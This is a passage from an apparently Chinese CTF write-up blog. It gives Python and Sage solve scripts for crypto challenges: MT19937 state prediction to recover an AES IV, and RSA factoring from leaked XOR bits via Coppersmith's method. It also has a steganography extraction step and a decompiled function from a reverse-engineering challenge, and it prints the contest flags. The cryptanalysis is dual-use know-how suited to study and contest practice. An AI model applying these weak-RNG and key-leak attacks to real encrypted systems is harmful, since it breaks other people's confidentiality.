class="hljs-built_in">sum</span>([[<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">8</span>)][::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> X], [])<br>out = out[:<span class="hljs-number">624</span>]<br>out = [crack_extract(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out]<br><br>ans = <span class="hljs-built_in">list</span>()<br>out = crack_twist(out)<br>ans += out<br>out = crack_twist(out)<br>ans = out[-(<span class="hljs-number">640</span>-<span class="hljs-number">624</span>):] + ans<br><br>ans = [extract(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans]<br>A = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ans[i:i+<span class="hljs-number">32</span>]][::-<span class="hljs-number">1</span>]), <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ans), <span class="hljs-number">32</span>)]<br>A = [<span class="hljs-number">0</span>] + A<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    n = <span class="hljs-number">21</span><br>    res = <span class="hljs-number">0</span><br>    tmp = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        res = (res + tmp * A[i]) % p<br>        tmp = tmp * x % p<br>    <span class="hljs-keyword">return</span> res % p<br><br>secret = (res[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] - f(res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])) % p<br>Q = N // secret<br>d = inverse(<span class="hljs-number">0x10001</span>, N-secret-Q+<span class="hljs-number">1</span>)<br>m = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, N))<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h2 id="colorful-matrix"><a href="#colorful-matrix" class="headerlink" title="colorful_matrix"></a>colorful_matrix</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">ns = [<span class="hljs-number">38630062416586710341458654419912504176237737247477839749085033080367529539859992076587411537805430366799412095876782912512744262957062106155418341531142309858429218208463637096843365217114990765965110566415965985105403996944993619708417839598461935470469097206342256014086162845948208599334925650727933097059538199199685364793545286980392966271769914201657672004082101110775504946586957241075964270454872257405872181588544468173017149763827540561921126826597515171761064800381983526515300315517818122598179574900255685121991744205071544970</span>, <span class="hljs-number">41522753602903133841910260331594875922287719226997542592715810409935551768308104573333760854332533376702631593490915962706512143045107096658851885513727202513616813054397657610854303071682604806070009002234312854968365250748142324994926715544722158698813288131533399544263105858513134170084625526223987620550110255872688155827773099232631041345207194483609514502522566888883736218471849075697433311580004701384847571029783514418685068903758509270527252444771313048094566344002411364378658592832008194309873599342916391769027015343562030852</span>, <span class="hljs-number">41542983120532762175372001624404625565366126179958909731196555044290633581761361918706298428954501507557598076910710787422049443564800530253137695341299743714514361560156305534490483794181933110893966453220306980682146624294992100948497284459992930850081254114996830645068636306625330524465991656430799359422407117440063911943625477783216502523414967017151717597372146324488526509879620785458016456593044828784565522423332830549325397893426472247197776412026158371655860380929692662547882654137064941217130915364306358205055760044763651406</span>, <span class="hljs-number">42853015443318352230776688785915441259875645365236808434164117288657978345098324019250085686482568413223085548506789311679316323466083886556772338612177680666217592255234589446979456714341877135596118517098603502394776049958587301113539552072352462301070489369653155854389890761241450743607560719433910573462283304103064437843063566946231984094581307498714742271881862348689297267558023093643893310002803310596286441071314219020032740336515363830250477649030557311461077069407775907176409762823453607196260454965048316567154365877848652918</span>, <span class="hljs-number">31152961872836435078296602982779340735140569916125711058616435902653202922218293684857125091648631460215120167354825278469413413558325850576700866199515219603448136082693185200558425103833947831228064760642508443585470729998592994719564254894176473779555436230174300038353978808432410463449170865897259181312953584408177790825688497584119467820716449210429423337019604137134889051973100340798405991782200038835066294194815913887924272593864934325496116821854183293510325217934617021428710898873475027666892706022106386340733691632884942848</span>]<br>A = [<span class="hljs-number">12789809461864875489953273982997537541385904671489556544122095227619591140533414669794423644619127980362623481580128258914287474542792728686579090501397390</span>, <span class="hljs-number">10463950513938701625808784986819665844287315724639315128677227520960105897990256530542006653611594269012930935073966767351788182657861624733138283749460454</span>, <span class="hljs-number">5253244650607533810967862436125419800679723144526973463211784033045021824966560017919956773745212139142517766154626849426827164032731516615725539069585525</span>, <span class="hljs-number">5644589184984504085855423002268477365020278981591337230721358313393863912025011466727192648804002734561676112555123877764178690726130713927642577324443238</span>, <span class="hljs-number">4231732567865883627242742552738439372803539125622706171540910152922080004603138662537022248675968288205781990968838888633816697065257733344028576518431020</span>, <span class="hljs-number">2483388920404524165854675814798022834892112957478917588986471421083048888193527751575039626887367465858751417977246719312923814782809309525841102293919541</span>, <span class="hljs-number">3252353812256192711411255830105475125944842449239880454539397067913664088094160819193268643401968970009466652179043139341471403913410402646923633696154454</span>, <span class="hljs-number">11575010486066232687430367040977113580882826853104996856464797182632266635060724100357205810604915010810884387573114266349621457564659060272935537811111850</span>, <span class="hljs-number">116107444921917032985259963199427176510900273385517435613848456370557161312731449337837406563733552524777525870560544042690403987311424820755256727586807</span>, <span class="hljs-number">5859050133610438843641532306693688255014116940390205022708310454673159702673207152462501010791971695002865650407033762568636006764435795015869726867643634</span>, <span class="hljs-number">5954075553161305677556950650395792531753502207483036473422070018485916621872566706504374038792527687442272405589975343003802956899043321092006127828986114</span>, <span class="hljs-number">4571747544457157571652286537158051402285727327066029382085461714597609990601683125994983291866807816649968826930652068427193317966970789937746419206862747</span>, <span class="hljs-number">7166507561570980603812241332170524724051295937096000768984168029904561160020043035660087151672164814332446644696618077835020463308343415953131944864257266</span>, <span class="hljs-number">4852042788460566411381271873349329096978244586097817622748766708426751073559942708861852208085367014057217116211249133109246735634468823924185525972777655</span>, <span class="hljs-number">11962941918999276757181090570698839032103646409734781047194175833198626142790676141060052011581957980660140931408560130449153056874213033784715711461403345</span>, <span class="hljs-number">10324508881746579337486319574059121005227580732153432145860775835052420139026016902518605634385512021513380467928195663920843022679549517463264144660593354</span>, <span class="hljs-number">13276257094435850052122403884510025189232513948002582716865201271569293297601525601586036713056700716929820641888489806178376555435219630186396004003438962</span>, <span class="hljs-number">6525051273399089095687950615197786094425890004112675057642687348101531212837185750558500720306108976630502328600886080197626115513445112562084719104488315</span>, <span class="hljs-number">12922888505610354933000354792496863801007995464403098763485264334670452387681468617068312646367483171083114539083453125614861357751571161533921864394641576</span>, <span class="hljs-number">9489726784141062031514945333087338495823600723655465328127755755022980083351477888038160719541864899912899592065620071698977397662002448273876711116012763</span>, <span class="hljs-number">10630316198843195148937849513165933809121991192035364160395429088101265852052098101114542104327663563661384303617672183366879116750889320604308038959012109</span>, <span class="hljs-number">12675564142993964272844760955973914547747654087592111324261755301551267959231076883765863344473167582531968290671984039948163579495803204811731286282708940</span>, <span class="hljs-number">11847724105274460405216443356582445218232627275228120716891711887600046501095390733716854871561352002320819466803698088448952127166615410820121973485089326</span>, <span class="hljs-number">5131676593756685549522564504727003861447389891839469018437277330988047271086971907217360711863971849879439418231726349935396008040776952541710218842744018</span>, <span class="hljs-number">8049060452950901277510497437779182190254362319091882684392717180429468875432078713802857488901441344429723298843967365750616860588029426099852763482179470</span>, <span class="hljs-number">2365060249260571713545479629411006471094806409182638354076861269679377537605360223984548798658469783472746989448405310909017645138161178501458084966625559</span>, <span class="hljs-number">7467521246204465304438401242342633361751371318557249418344587207503257890765643838557008735305668588521988487342275527781708126255070883848829062790678347</span>, <span class="hljs-number">5841608816993144092409175658260479687582056537041472535819914412630519543198558564258699185557903902095773598614097026740427138629173672250387442834578787</span>, <span class="hljs-number">3935779917509948624841228665498558015416911059417306651751360048412619176423173794541812556512582747588138532941031730797102738268660078594473168666677171</span>, <span class="hljs-number">1459083415233950534805962555425717865938763752937036513111696179351002303817986848490146888626704327653287774806488952733813718461674376764427084478395399</span>, <span class="hljs-number">6426876689549337938550615491086475536072547585103523407263007393570982327518298678278232288342601754164640081474537962710401178482959474762541185760732929</span>, <span class="hljs-number">5241364650650467046722868257809607948071188801137204831449976666385482519613365369974704486723941517654753205012497273820309153659423928739972270634209996</span>, <span class="hljs-number">6387483223002092292686097811446217867743566298067033295601210265979889577756648605354064672061975949925472022416479935990178719227937307079186916383092053</span>, <span class="hljs-number">170562164015232424518655058158727202269056868720093972639058422975773575660534168774299548952867348396798580779605954510297102765330549642318362861226163</span>, <span class="hljs-number">10004133230245713370426176448219282796530473722412487408402635996842671302539458739305597027107498342509248085998067976408732789438099488867425813748783724</span>, <span class="hljs-number">12325342879747412722323355648741345730921040452129462974449188258885453690169624888480720109964630270938743431623479816739889661554987977051169401841580388</span>, <span class="hljs-number">641543989928732942291347866597230552820621633110802944556141221591498546555080480758772801043509130524233886009444044150447511986129019395067102094826363</span>]<br>B = [<span class="hljs-number">108715652691370707411987210267535348806</span>, <span class="hljs-number">131676833696101475747102644851662113271</span>, <span class="hljs-number">122436706338521558335484593966234623745</span>, <span class="hljs-number">255864866572301552398412638474857375629</span>, <span class="hljs-number">81098761191414480003681301866161112100</span>, <span class="hljs-number">322322463176364397336266169283851913620</span>, <span class="hljs-number">198167679309202772183020662350938553923</span>, <span class="hljs-number">326360662842236388778385468938922853242</span>, <span class="hljs-number">241812832858991643670485138860832357660</span>, <span class="hljs-number">69768236619183466076110136290750715548</span>, <span class="hljs-number">32383134960394164339076842474280712870</span>, <span class="hljs-number">147747232748027508904245311745435517130</span>, <span class="hljs-number">25327826075608705748116808975774398964</span>, <span class="hljs-number">65295332681674581261444632606267440749</span>, <span class="hljs-number">236756211690281667988216748814564193312</span>, <span class="hljs-number">106435149910135092172124474857722935730</span>, <span class="hljs-number">270727089812520941022075406571244846193</span>, <span class="hljs-number">206881193220261276126028739930244917728</span>, <span class="hljs-number">131961838897694897398340205404861333362</span>, <span class="hljs-number">219211823942216355573832791993673934321</span>, <span class="hljs-number">150960424777134558142309786444952807101</span>, <span class="hljs-number">51112048255939343109218372373173385772</span>, <span class="hljs-number">182065623911902509203036774197184164110</span>, <span class="hljs-number">168420344895532090057957641972492853410</span>, <span class="hljs-number">301808673225362418769168353084541667053</span>, <span class="hljs-number">132272458662433671393247350648662880688</span>, <span class="hljs-number">495672626901999558635736361346563007</span>, <span class="hljs-number">182444159345379042372018248514964944782</span>, <span class="hljs-number">144584137563407779776361378564517880036</span>, <span class="hljs-number">338518705859818740467225748906995999694</span>, <span class="hljs-number">205885429741815676881969528495365151019</span>, <span class="hljs-number">233897982464483450790005953366237992668</span>, <span class="hljs-number">279307677123402840425362992920185630901</span>, <span class="hljs-number">133493426228159673166382443820069696429</span>, <span class="hljs-number">316624110847744871475435405969944304329</span>, <span class="hljs-number">187931604382397525131117897387179435812</span>, <span class="hljs-number">220019728924915067987393012581921164417</span>]<br>enc = <span class="hljs-string">b&#x27;cTmkMb\xfc\x05|\x1d\xc7\x13\xbaSe\xe0\xbd\xc0\xd9\xa3\x8cwo\x82yN[B&amp;\x80\xd7KPwQ`\x9c\xbf&lt;y\x8e\x8a\x97e\xa074\xb2&#x27;</span><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> mt19937predictor <span class="hljs-keyword">import</span> MT19937Predictor<br><br>p = <span class="hljs-number">293423658885957174953198318664231534672400520068303593221989900395768107225130267646792968959460384248015583618158947268381852534151783869878808621629530642974652628810907251607210136313789978156955302211733219987661815438401343683</span><br>key1 = long_to_bytes(p)[:-<span class="hljs-number">64</span>]<br><br><br>predictor = MT19937Predictor()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ns:predictor.setrandbits(i % p, <span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A:predictor.setrandbits(i, <span class="hljs-number">512</span>)<br><br>iv = long_to_bytes(predictor.getrandbits(<span class="hljs-number">128</span>))<br>aes = AES.new(key1,AES.MODE_CBC,iv)<br>flag = aes.decrypt(enc)<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#flag&#123;86baa4ed-5ec7-11ee-ae14-ac1203ab14da&#125;</span><br></code></pre></td></tr></table></figure><h2 id="LeakyRSA"><a href="#LeakyRSA" class="headerlink" title="LeakyRSA"></a>LeakyRSA</h2><p>先求出p和q的高位，低位用copper，中间用爆破，epsilon=0.01</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python">N = <span class="hljs-number">73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569362139057327962393611139347462018186440108621311077722819578905265976612923</span><br>gift = <span class="hljs-number">2223117424030234543005449667053988296724455736030907136592525175314696509716321</span><br>gift &lt;&lt;=<span class="hljs-number">250</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(N))<br>ok = <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pq_xor</span>(<span class="hljs-params">tp,tq,idx</span>):<br>    <span class="hljs-keyword">global</span> ok <br>    <br>    <span class="hljs-keyword">if</span> ok:<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span> tp*tq&gt;N:<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span> (tp+(<span class="hljs-number">2</span>&lt;&lt;idx))*(tq+(<span class="hljs-number">2</span>&lt;&lt;idx))&lt;N:<br>        <span class="hljs-keyword">return</span> <br>        <br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">250</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f = tp + x <br>            rr = f.monic().small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">250</span>, beta=<span class="hljs-number">0.45</span>,epsilon=<span class="hljs-number">0.01</span>)<br>            <span class="hljs-built_in">print</span>(rr)<br>            <span class="hljs-keyword">if</span> rr != []:<br>                <span class="hljs-built_in">print</span>(rr)<br>                <span class="hljs-built_in">print</span>(tp)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#x27;</span>,f(rr[<span class="hljs-number">0</span>]))<br>                ok = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <br>        <span class="hljs-keyword">return</span><br>    <br>    idx -=<span class="hljs-number">1</span><br>    b = (gift &gt;&gt;idx)&amp;<span class="hljs-number">1</span><br>    one = <span class="hljs-number">1</span>&lt;&lt;idx <br>    <span class="hljs-keyword">if</span> b==<span class="hljs-number">0</span>:<br>        pq_xor(tp,tq,idx)    <br>        pq_xor(tp+one,tq+one,idx)    <br>    <span class="hljs-keyword">else</span>:   <span class="hljs-comment">#1</span><br>        pq_xor(tp+one,tq,idx)<br>        pq_xor(tp,tq+one,idx)<br><br>tp = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">511</span><br>tq = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">511</span><br>pq_xor(tp,tq,<span class="hljs-number">511</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">6814449132912466352143200200256605077873329465758477832056090562012411200107156482645933890997787435093806046493913273252717701817613907418845774345791241</span><br>q = <span class="hljs-number">10833217580503000698385694268032196544400600307706228180481286239545614448110770843300361411809086269809006469621399256214887200838529724133384063799751203</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">71808322808599218331233291542779486534747913572475630198802984648982830332628443972652322590637382696027943799004331488098592525306523343649935216419522329722152742610560398216737030893090641493326477786720839849938277402743820773957184083430369443325368720115515840174745825798187125454448297155036065857691</span><br>n = p*q<br>phi = (q-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)<br>d = inverse(e, phi) <br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#flag&#123;6eb67115-38b1-4e75-b3fc-de3a9697e565&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="我的壁纸"><a href="#我的壁纸" class="headerlink" title="我的壁纸"></a>我的壁纸</h2><p>foremost分出三个文件<br>对flag.txt解snow隐写 key在jpg文件尾；flag.wav解SSTV；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf youshouldknowme.jpeg -p 7hR@1nB0$&amp;<br><br><span class="hljs-built_in">cat</span> flag.txt<br><br>flag&#123;b921323f-<br></code></pre></td></tr></table></figure><p><code>flag&#123;b921323f-eaa2-4d62-ace6-f86361842eb8&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>鹏城杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023网信柏鹭杯</title>
    <link href="/2023/10/11/2023%E7%BD%91%E4%BF%A1%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <url>/2023/10/11/2023%E7%BD%91%E4%BF%A1%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="imm"><a href="#imm" class="headerlink" title="imm"></a>imm</h4><p>关键函数<code>sub_415190</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> __fastcall <span class="hljs-title function_">sub_415190</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span><br>&#123;<br>    <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebp</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// esi</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// edi</span><br>    <span class="hljs-type">char</span> v5; <span class="hljs-comment">// al</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// ecx</span><br>    <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// ecx</span><br>    <span class="hljs-type">char</span> *v8; <span class="hljs-comment">// edx</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9; <span class="hljs-comment">// esi</span><br>    <span class="hljs-type">bool</span> v14; <span class="hljs-comment">// cf</span><br>    <span class="hljs-type">char</span> v16[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-B0h] [ebp-BCh]</span><br>    <span class="hljs-type">char</span> v18[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp-84h] [ebp-90h] BYREF</span><br>    <span class="hljs-type">char</span> v19[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-80h] [ebp-8Ch] BYREF</span><br>    <span class="hljs-type">int</span> v20; <span class="hljs-comment">// [esp-60h] [ebp-6Ch]</span><br>    <span class="hljs-type">int</span> v21; <span class="hljs-comment">// [esp-5Ch] [ebp-68h]</span><br>    <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [esp-58h] [ebp-64h]</span><br>    <span class="hljs-type">int</span> v23; <span class="hljs-comment">// [esp-54h] [ebp-60h]</span><br>    <span class="hljs-type">int</span> v24; <span class="hljs-comment">// [esp-50h] [ebp-5Ch]</span><br>    <span class="hljs-type">int</span> v25; <span class="hljs-comment">// [esp-4Ch] [ebp-58h]</span><br>    <span class="hljs-type">int</span> v26; <span class="hljs-comment">// [esp-48h] [ebp-54h]</span><br>    <span class="hljs-type">int</span> v27; <span class="hljs-comment">// [esp-44h] [ebp-50h]</span><br>    <span class="hljs-type">char</span> v28[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-40h] [ebp-4Ch]</span><br>    <span class="hljs-type">char</span> v29[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-20h] [ebp-2Ch] BYREF</span><br>    _DWORD v30[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [esp+0h] [ebp-Ch] BYREF</span><br>    <span class="hljs-type">void</span> *retaddr; <span class="hljs-comment">// [esp+Ch] [ebp+0h]</span><br><br>    v30[<span class="hljs-number">0</span>] = v1;<br>    v30[<span class="hljs-number">1</span>] = retaddr;<br>    _EBP = v30;<br>    *(_OWORD *)v16 = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)&amp;v16[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)v29 = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)&amp;v29[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>i64;<br>    *(_DWORD *)v19 = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">4</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">8</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">12</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">16</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">20</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">24</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">28</span>] = <span class="hljs-number">-1</span>;<br>    v3 = <span class="hljs-built_in">strlen</span>(s);<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">0x40</span> )<br>    &#123;<br>        v4 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( *(_DWORD *)v18 = <span class="hljs-number">0</span>; v4 &lt; v3; v16[v6] = v5 )<br>        &#123;<br>            v18[<span class="hljs-number">0</span>] = s[v4];<br>            v18[<span class="hljs-number">1</span>] = s[v4 + <span class="hljs-number">1</span>];<br>            v5 = strtol(v18, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>            v6 = v4 &gt;&gt; <span class="hljs-number">1</span>;<br>            v4 += <span class="hljs-number">2</span>;<br>        &#125;<br>    &#125;<br>    *(_DWORD *)v28 = <span class="hljs-number">0x765EEBCD</span>;<br>    v7 = v29;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">4</span>] = <span class="hljs-number">0x31AF220F</span>;<br>    v8 = v19;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">8</span>] = <span class="hljs-number">0xEF3C9282</span>;<br>    v9 = <span class="hljs-number">28</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">12</span>] = <span class="hljs-number">0x676C1B8</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">16</span>] = <span class="hljs-number">0x7DB52F18</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">20</span>] = <span class="hljs-number">0x85EA0A7F</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">24</span>] = <span class="hljs-number">0xA3890092</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">28</span>] = <span class="hljs-number">0x32E7E22C</span>;<br>    __asm<br>    &#123;<br>        vmovdqu ymm0, ymmword ptr [ebp<span class="hljs-number">-40</span>h]<br>            vpxor   ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-0B</span>0h]<br>        &#125;<br>    v20 = <span class="hljs-number">0xE06070A</span>;<br>    v21 = <span class="hljs-number">0xD030B02</span>;<br>    v22 = <span class="hljs-number">0x5000901</span>;<br>    v23 = <span class="hljs-number">0xC080F04</span>;<br>    v24 = <span class="hljs-number">0x1F17181B</span>;<br>    v25 = <span class="hljs-number">0x13121E14</span>;<br>    v26 = <span class="hljs-number">0x1C161D15</span>;<br>    v27 = <span class="hljs-number">0x1A191011</span>;<br>    __asm &#123; vpshufb ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-60</span>h] &#125;<br>    *(_DWORD *)v29 = <span class="hljs-number">0xE899915F</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">4</span>] = <span class="hljs-number">0x92B0D04E</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">8</span>] = <span class="hljs-number">0xF44F3CB1</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">12</span>] = <span class="hljs-number">0x12DA7617</span>;<br>    *(_DWORD *)&amp;v29[<span class="hljs-number">16</span>] = <span class="hljs-number">0x1501352A</span>;<br>    *(_DWORD *)&amp;v29[<span 